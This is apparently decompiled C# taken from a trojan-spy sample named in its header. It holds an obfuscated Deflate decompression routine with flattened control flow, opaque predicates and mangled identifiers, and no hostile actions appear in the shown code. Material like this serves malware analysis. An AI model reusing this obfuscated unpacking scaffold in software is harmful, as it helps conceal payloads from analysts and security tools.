// Decompiled with JetBrains decompiler
// Type: #rc.#qc
// Assembly: qouzb, Version=0.0.0.0, Culture=neutral, PublicKeyToken=34256fcd934ca661
// MVID: 528C9DDA-94F5-4688-B6FB-056FFA07C362
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.Win32.Generic-6c64cd522d7e6f3c0b6f0116271cde81e35213ad4a360fe569f48f99fd473e62.exe

using \u0023rc;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u0023rc
{
  internal static class \u0023qc
  {
    public static string \u0023pc;

    internal class \u0023Gc
    {
      internal static readonly int[] \u0023sc;
      internal static readonly int[] \u0023tc;
      internal static readonly int[] \u0023uc;
      internal static readonly int[] \u0023vc;
      internal int \u0023wc;
      internal int \u0023xc;
      internal int \u0023yc;
      internal int \u0023zc;
      internal int \u0023Ac;
      internal bool \u0023Bc;
      internal \u0023qc.\u0023Mc \u0023E;
      internal \u0023qc.\u0023Cc \u0023Cc;
      internal \u0023qc.\u00236c \u0023Dc;
      internal \u0023qc.\u0023Sc \u0023Ec;
      internal \u0023qc.\u0023Sc \u0023Fc;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Gc([In] byte[] obj0)
      {
        try
        {
          this.\u0023E = new \u0023qc.\u0023Mc();
          int num = 3;
          while (true)
          {
            switch (num)
            {
              case 0:
              case 3:
                this.\u0023Cc = new \u0023qc.\u0023Cc();
                goto case 1;
              case 1:
              case 2:
                this.\u0023wc = 2;
                if (true)
                {
                  num = 4;
                  continue;
                }
                goto case 0;
              case 4:
                goto label_6;
              default:
                num = 2;
                continue;
            }
          }
label_6:
          \u0023\u0023.\u0023Xi(0, obj0.Length, this.\u0023E, obj0);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0023\u0023.\u0023Jk(ex, (object) this, (object) numArray);
          throw;
        }
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      static \u0023Gc()
      {
        try
        {
          \u0023qc.\u0023Gc.\u0023sc = new int[29]
          {
            3,
            4,
            5,
            6,
            7,
            8,
            9,
            10,
            11,
            13,
            15,
            17,
            19,
            23,
            27,
            31,
            35,
            43,
            51,
            59,
            67,
            83,
            99,
            115,
            131,
            163,
            195,
            227,
            258
          };
          int num1 = 3;
          while (true)
          {
            int num2 = num1;
            while (true)
            {
              switch (num2)
              {
                case 0:
                case 3:
                  \u0023qc.\u0023Gc.\u0023tc = new int[29]
                  {
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    1,
                    1,
                    1,
                    1,
                    2,
                    2,
                    2,
                    2,
                    3,
                    3,
                    3,
                    3,
                    4,
                    4,
                    4,
                    4,
                    5,
                    5,
                    5,
                    5,
                    0
                  };
                  goto case 1;
                case 1:
                case 2:
                  \u0023qc.\u0023Gc.\u0023uc = new int[30]
                  {
                    1,
                    2,
                    3,
                    4,
                    5,
                    7,
                    9,
                    13,
                    17,
                    25,
                    33,
                    49,
                    65,
                    97,
                    129,
                    193,
                    257,
                    385,
                    513,
                    769,
                    1025,
                    1537,
                    2049,
                    3073,
                    4097,
                    6145,
                    8193,
                    12289,
                    16385,
                    24577
                  };
                  if (true)
                  {
                    num2 = 4;
                    continue;
                  }
                  goto case 0;
                case 4:
                  goto label_6;
                default:
                  goto label_5;
              }
            }
label_5:
            num1 = 2;
          }
label_6:
          \u0023qc.\u0023Gc.\u0023vc = new int[30]
          {
            0,
            0,
            0,
            0,
            1,
            1,
            2,
            2,
            3,
            3,
            4,
            4,
            5,
            5,
            6,
            6,
            7,
            7,
            8,
            8,
            9,
            9,
            10,
            10,
            11,
            11,
            12,
            12,
            13,
            13
          };
        }
        catch (Exception ex)
        {
          \u0023\u0023.\u00236i(ex);
          throw;
        }
      }

      internal static bool sQyZlaKmfaWPHul1yap() => true;

      internal static bool DFvkwYKIA5aidKCIrHZ() => false;
    }

    internal class \u0023Mc
    {
      internal byte[] \u0023Hc;
      internal int \u0023Ic;
      internal int \u0023Jc;
      internal uint \u0023Kc;
      internal int \u0023Lc;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Mc()
      {
      }
    }

    internal class \u0023Cc
    {
      internal byte[] \u0023Hc = new byte[32768];
      internal int \u0023Nc;
      internal int \u0023Oc;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Cc()
      {
      }

      internal static bool teLUHGK7CJxLTO8kRja() => true;

      internal static bool zfBwV6KbUKtfs6bHAYi() => false;
    }

    internal class \u0023Sc
    {
      internal short[] \u0023Pc;
      public static readonly \u0023qc.\u0023Sc \u0023Qc;
      public static readonly \u0023qc.\u0023Sc \u0023Rc;

      [MethodImpl(MethodImplOptions.NoInlining)]
      static \u0023Sc()
      {
        byte[] numArray1;
        int num1;
        try
        {
          numArray1 = new byte[288];
          int num2 = 5;
          while (true)
          {
            int num3 = num2;
            while (true)
            {
              switch (num3)
              {
                case 0:
                case 5:
                  num1 = 0;
                  while (num1 < 144)
                    numArray1[num1++] = (byte) 8;
                  while (num1 < 256)
                    numArray1[num1++] = (byte) 9;
                  while (num1 < 280)
                    numArray1[num1++] = (byte) 7;
                  num3 = 3;
                  continue;
                case 1:
                  numArray1 = new byte[32];
                  num3 = 6;
                  continue;
                case 2:
                  \u0023qc.\u0023Sc.\u0023Qc = new \u0023qc.\u0023Sc(numArray1);
                  goto case 1;
                case 3:
                  while (num1 < 288)
                    numArray1[num1++] = (byte) 8;
                  num3 = 2;
                  continue;
                case 4:
                case 6:
                  goto label_10;
                case 7:
                  goto label_21;
                default:
                  goto label_20;
              }
            }
label_10:
            num1 = 0;
            while (num1 < 32)
              numArray1[num1++] = (byte) 5;
            num2 = 7;
            continue;
label_20:
            num2 = 1;
          }
label_21:
          \u0023qc.\u0023Sc.\u0023Rc = new \u0023qc.\u0023Sc(numArray1);
        }
        catch (Exception ex)
        {
          byte[] numArray2 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num1;
          \u0023\u0023.\u0023Jk(ex, (object) numArray2, (object) local);
          throw;
        }
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Sc([In] byte[] obj0)
      {
        try
        {
          \u0023\u0023.\u0023Yj(obj0, this);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0023\u0023.\u0023Jk(ex, (object) this, (object) numArray);
          throw;
        }
      }

      internal static bool kHYgKfKyRIc5csGJk62() => true;

      internal static bool gQFqyaKQSfV1ZB7YI00() => false;
    }

    internal class \u00236c
    {
      internal static readonly int[] \u0023Tc;
      internal static readonly int[] \u0023Uc;
      internal byte[] \u0023Vc;
      internal byte[] \u0023Wc;
      internal \u0023qc.\u0023Sc \u0023Xc;
      internal int \u0023wc;
      internal int \u0023Yc;
      internal int \u0023Zc;
      internal int \u00230c;
      internal int \u00231c;
      internal int \u00232c;
      internal byte \u00233c;
      internal int \u00234c;
      internal static readonly int[] \u00235c;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u00236c()
      {
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      static \u00236c()
      {
        try
        {
          \u0023qc.\u00236c.\u0023Tc = new int[3]
          {
            3,
            3,
            11
          };
          int num = 2;
          while (true)
          {
            switch (num)
            {
              case 0:
              case 2:
                goto label_1;
              case 1:
              case 3:
                goto label_4;
              default:
                num = 3;
                continue;
            }
          }
label_1:
          \u0023qc.\u00236c.\u0023Uc = new int[3]
          {
            2,
            3,
            7
          };
label_4:
          \u0023qc.\u00236c.\u00235c = new int[19]
          {
            16,
            17,
            18,
            0,
            8,
            7,
            9,
            6,
            10,
            5,
            11,
            4,
            12,
            3,
            13,
            2,
            14,
            1,
            15
          };
        }
        catch (Exception ex)
        {
          \u0023\u0023.\u00236i(ex);
          throw;
        }
      }

      internal static bool dwSSaqKCjNkWWIgdXTT() => true;

      internal static bool GftlAJKBi2O22JaUtp7() => false;
    }

    internal class \u0023bd
    {
      internal int \u00237c;
      internal long \u00238c;
      internal \u0023qc.\u0023Pd \u00239c;
      internal \u0023qc.\u0023Jd \u0023ad;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023bd()
      {
        int num1 = 2;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 2:
                goto label_1;
              case 1:
              case 3:
                goto label_2;
              case 4:
                goto label_6;
              default:
                num2 = 4;
                continue;
            }
          }
label_1:
          this.\u00237c = 16;
          num1 = 3;
        }
label_2:
        // ISSUE: explicit constructor call
        base.\u002Ector();
label_6:
        try
        {
          this.\u00239c = new \u0023qc.\u0023Pd();
          this.\u0023ad = new \u0023qc.\u0023Jd(this.\u00239c);
        }
        catch (Exception ex)
        {
          \u0023\u0023.\u0023Oj(ex, (object) this);
          throw;
        }
      }

      internal static bool UcQTN6KflxMv8Ef3ZE9() => true;

      internal static bool TF7HP8KcxcExdfKmuF7() => false;
    }

    internal class \u0023md
    {
      internal static readonly int[] \u00235c;
      internal static readonly byte[] \u0023cd;
      internal \u0023qc.\u0023Pd \u00239c;
      internal \u0023qc.\u0023md.\u0023Pc \u0023dd;
      internal \u0023qc.\u0023md.\u0023Pc \u0023Fc;
      internal \u0023qc.\u0023md.\u0023Pc \u0023Xc;
      internal short[] \u0023ed;
      internal byte[] \u0023fd;
      internal int \u0023gd;
      internal int \u0023hd;
      internal static readonly short[] \u0023id;
      internal static readonly byte[] \u0023jd;
      internal static readonly short[] \u0023kd;
      internal static readonly byte[] \u0023ld;

      [MethodImpl(MethodImplOptions.NoInlining)]
      static \u0023md()
      {
        int index;
        try
        {
          \u0023qc.\u0023md.\u00235c = new int[19]
          {
            16,
            17,
            18,
            0,
            8,
            7,
            9,
            6,
            10,
            5,
            11,
            4,
            12,
            3,
            13,
            2,
            14,
            1,
            15
          };
          int num1 = 5;
          while (true)
          {
            int num2;
            switch (num1)
            {
              case 0:
              case 6:
              case 7:
                if (index < 280)
                {
                  \u0023qc.\u0023md.\u0023id[index] = \u0023\u0023.\u00238h(index - 256 << 9);
                  \u0023qc.\u0023md.\u0023jd[index++] = (byte) 7;
                  num2 = 7;
                  break;
                }
                for (; index < 286; \u0023qc.\u0023md.\u0023jd[index++] = (byte) 8)
                  \u0023qc.\u0023md.\u0023id[index] = \u0023\u0023.\u00238h(index - 88 << 8);
                \u0023qc.\u0023md.\u0023kd = new short[30];
                \u0023qc.\u0023md.\u0023ld = new byte[30];
                index = 0;
                goto case 9;
              case 1:
              case 3:
                \u0023qc.\u0023md.\u0023jd[index++] = (byte) 8;
                goto case 2;
              case 2:
                if (index < 144)
                {
                  \u0023qc.\u0023md.\u0023id[index] = \u0023\u0023.\u00238h(48 + index << 8);
                  if (\u0023qc.\u0023md.db0M8QKun43ePMNU0l2())
                  {
                    num1 = 1;
                    continue;
                  }
                  goto case 4;
                }
                else
                  goto case 8;
              case 4:
                \u0023qc.\u0023md.\u0023jd = new byte[286];
                index = 0;
                num2 = 2;
                break;
              case 5:
                \u0023qc.\u0023md.\u0023cd = new byte[16]
                {
                  (byte) 0,
                  (byte) 8,
                  (byte) 4,
                  (byte) 12,
                  (byte) 2,
                  (byte) 10,
                  (byte) 6,
                  (byte) 14,
                  (byte) 1,
                  (byte) 9,
                  (byte) 5,
                  (byte) 13,
                  (byte) 3,
                  (byte) 11,
                  (byte) 7,
                  (byte) 15
                };
                \u0023qc.\u0023md.\u0023id = new short[286];
                if (true)
                {
                  num1 = 4;
                  continue;
                }
                goto case 1;
              case 8:
                for (; index < 256; \u0023qc.\u0023md.\u0023jd[index++] = (byte) 9)
                  \u0023qc.\u0023md.\u0023id[index] = \u0023\u0023.\u00238h(256 + index << 7);
                num2 = 0;
                break;
              case 9:
                if (index < 30)
                {
                  \u0023qc.\u0023md.\u0023kd[index] = \u0023\u0023.\u00238h(index << 11);
                  \u0023qc.\u0023md.\u0023ld[index] = (byte) 5;
                  ++index;
                  num2 = 9;
                  break;
                }
                goto label_20;
              default:
                num2 = 8;
                break;
            }
            num1 = num2;
          }
label_20:;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) index;
          \u0023\u0023.\u0023Oj(ex, (object) local);
          throw;
        }
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023md([In] \u0023qc.\u0023Pd obj0)
      {
        try
        {
          this.\u00239c = obj0;
          int num = 4;
          if (\u0023qc.\u0023md.db0M8QKun43ePMNU0l2())
            goto label_3;
label_2:
          this.\u0023Fc = new \u0023qc.\u0023md.\u0023Pc(this, 30, 1, 15);
          this.\u0023Xc = new \u0023qc.\u0023md.\u0023Pc(this, 19, 4, 7);
          goto label_5;
label_3:
          while (true)
          {
            switch (num)
            {
              case 0:
              case 1:
                goto label_2;
              case 2:
              case 3:
                goto label_5;
              case 4:
                this.\u0023dd = new \u0023qc.\u0023md.\u0023Pc(this, 286, 257, 15);
                num = 0;
                continue;
              case 5:
                goto label_7;
              default:
                num = 3;
                continue;
            }
          }
label_7:
          this.\u0023fd = new byte[16384];
          return;
label_5:
          this.\u0023ed = new short[16384];
          num = 5;
          goto label_3;
        }
        catch (Exception ex)
        {
          \u0023qc.\u0023Pd pd = obj0;
          \u0023\u0023.\u0023Jk(ex, (object) this, (object) pd);
          throw;
        }
      }

      internal static bool db0M8QKun43ePMNU0l2() => true;

      internal static bool k8r8mUK04mXXnSGfOgX() => false;

      public class \u0023Pc
      {
        public short[] \u0023nd;
        public byte[] \u0023od;
        public int \u0023pd;
        public int \u0023qd;
        internal short[] \u0023rd;
        internal int[] \u0023sd;
        internal int \u0023td;
        internal \u0023qc.\u0023md \u0023ud;

        [MethodImpl(MethodImplOptions.NoInlining)]
        public \u0023Pc([In] \u0023qc.\u0023md obj0, [In] int obj1, [In] int obj2, [In] int obj3)
        {
          try
          {
            this.\u0023ud = obj0;
            int num = 2;
            if (!\u0023qc.\u0023md.\u0023Pc.gHPUTeKvYmaxsr77eVO())
              goto label_3;
label_2:
            this.\u0023pd = obj2;
            goto label_5;
label_3:
            while (true)
            {
              switch (num)
              {
                case 0:
                case 2:
                  goto label_2;
                case 1:
                case 3:
                  goto label_5;
                case 4:
                  goto label_6;
                default:
                  num = 3;
                  continue;
              }
            }
label_5:
            this.\u0023td = obj3;
            this.\u0023nd = new short[obj1];
            if (\u0023qc.\u0023md.\u0023Pc.oLYm9cK4SMEBfU7tv3t())
            {
              num = 4;
              goto label_3;
            }
label_6:
            this.\u0023sd = new int[obj3];
          }
          catch (Exception ex)
          {
            \u0023qc.\u0023md md = obj0;
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) obj1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) obj2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) obj3;
            \u0023\u0023.\u0023mk(ex, (object) this, (object) md, (object) local1, (object) local2, (object) local3);
            throw;
          }
        }

        internal static bool oLYm9cK4SMEBfU7tv3t() => true;

        internal static bool gHPUTeKvYmaxsr77eVO() => false;
      }
    }

    internal class \u0023Jd
    {
      internal int \u0023vd;
      internal short[] \u0023wd;
      internal short[] \u0023xd;
      internal int \u0023yd;
      internal int \u0023zd;
      internal bool \u0023Ad;
      internal int \u0023Bd;
      internal int \u0023Cd;
      internal int \u0023Dd;
      internal byte[] \u0023Hc;
      internal byte[] \u0023Ed;
      internal int \u0023Fd;
      internal int \u0023Gd;
      internal int \u0023Hd;
      internal \u0023qc.\u0023Pd \u00239c;
      internal \u0023qc.\u0023md \u0023Id;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Jd([In] \u0023qc.\u0023Pd obj0)
      {
        int num1;
        try
        {
          this.\u00239c = obj0;
          int num2 = 0;
          while (true)
          {
            switch (num2)
            {
              case 0:
                this.\u0023Id = new \u0023qc.\u0023md(obj0);
                if (true)
                {
                  num2 = 3;
                  continue;
                }
                goto label_7;
              case 1:
              case 3:
                this.\u0023Hc = new byte[65536];
                this.\u0023wd = new short[32768];
                goto case 2;
              case 2:
              case 4:
                this.\u0023xd = new short[32768];
                num2 = 5;
                continue;
              case 5:
                goto label_7;
              default:
                if (\u0023qc.\u0023Jd.YfssFyKOi02nafvMCYY())
                {
                  num2 = 4;
                  continue;
                }
                goto case 0;
            }
          }
label_7:
          this.\u0023Cd = num1 = 1;
          this.\u0023Bd = num1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num1;
          \u0023qc.\u0023Pd pd = obj0;
          \u0023\u0023.\u0023Dj(ex, (object) local, (object) this, (object) pd);
          throw;
        }
      }

      internal static bool YfssFyKOi02nafvMCYY() => true;

      internal static bool NBGFm8K9mvrKB2DbZ2O() => false;
    }

    internal class \u0023Pd
    {
      protected internal byte[] \u0023Kd = new byte[65536];
      internal int \u0023Ld;
      internal int \u0023Md;
      internal uint \u0023Nd;
      internal int \u0023Od;

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Pd()
      {
      }

      internal static bool rA1YNIKSiEGcY7guDyL() => true;

      internal static bool K583SOKhUwqI460PM7n() => false;
    }

    internal class \u0023Qd : MemoryStream
    {
      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Qd()
      {
      }

      [MethodImpl(MethodImplOptions.NoInlining)]
      public \u0023Qd([In] byte[] obj0)
        : base(obj0, false)
      {
      }

      internal static bool f8fojpKWX9fukdnkSrd() => true;

      internal static bool ykCmdFKoXOWVbxIUoDf() => false;
    }
  }
}
